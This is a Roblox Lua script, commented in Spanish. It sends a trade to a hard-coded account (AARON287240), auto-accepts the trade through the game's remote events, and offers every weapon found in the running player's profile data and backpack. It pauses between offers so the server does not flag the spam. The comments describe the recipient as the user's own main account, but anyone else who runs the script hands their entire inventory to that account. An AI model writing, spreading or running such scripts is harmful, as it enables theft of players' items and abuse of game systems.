-- Paso 1: Enviar el trade a tu cuenta principal (AARON287240)
local targetUserId = 10631566712
local targetPlayer = nil

for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
    if player.UserId == targetUserId then
        targetPlayer = player
        break
    end
end

if targetPlayer then
    local argsSend = {
        [1] = targetPlayer
    }
    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(argsSend))
    print("¡Solicitud de trade enviada a AARON287240!")
else
    warn("No se encontró al jugador principal en el servidor.")
    return
end

-- Esperar a que se abra la sesión de trade
task.wait(1.5)

-- Paso 2: Aceptar el trade automáticamente
local acceptArgs = {
    [1] = 428469873,
    [2] = 21997.844980315014
}
pcall(function()
    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(acceptArgs))
end)

task.wait(0.5)

-- Paso 3: Extraer TODAS las armas del inventario usando la estructura del juego
-- Intentamos buscar los datos del perfil del jugador local que maneja el módulo
local success, profileData = pcall(function()
    -- Buscamos el módulo ProfileData o los datos en el cliente
    local modules = game:GetService("ReplicatedStorage"):WaitForChild("Modules")
    return require(modules:WaitForChild("ProfileData"))
end)

local weaponsList = {}

if success and profileData and profileData.Weapons and profileData.Weapons.Owned then
    -- Si encontramos los datos de armas normales
    for _, weaponName in pairs(profileData.Weapons.Owned) do
        if type(weaponName) == "string" then
            table.insert(weaponsList, weaponName)
        end
    end
end

-- También buscamos armas "Uniques" si las hay en el inventario
if success and profileData and profileData.Uniques then
    for _, uniqueItem in pairs(profileData.Uniques) do
        if uniqueItem.BaseItem then
            table.insert(weaponsList, uniqueItem.BaseItem)
        end
    end
end

-- Si por alguna razón no leyó el módulo, escaneamos la mochila clásica por seguridad
local backpack = game:GetService("Players").LocalPlayer:FindFirstChild("Backpack")
if backpack then
    for _, item in ipairs(backpack:GetChildren()) do
        table.insert(weaponsList, item.Name)
    end
end

print("¡Se detectaron " .. #weaponsList .. " armas para ofrecer!")

-- Paso 4: Ofrecer cada arma encontrada al trade de forma automática
for _, weaponName in ipairs(weaponsList) do
    local offerArgs = {
        [1] = weaponName,
        [2] = "Weapons"
    }
    
    local successOffer, err = pcall(function()
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(offerArgs))
    end)
    
    if successOffer then
        print("✔ Arma ofrecida: " .. weaponName)
    else
        warn("✖ No se pudo ofrecer " .. weaponName .. ": " .. tostring(err))
    end
    
    -- Pequeña pausa para evitar que el servidor te detecte spam
    task.wait(0.15)
end

print("¡Proceso de trade y oferta completado!")
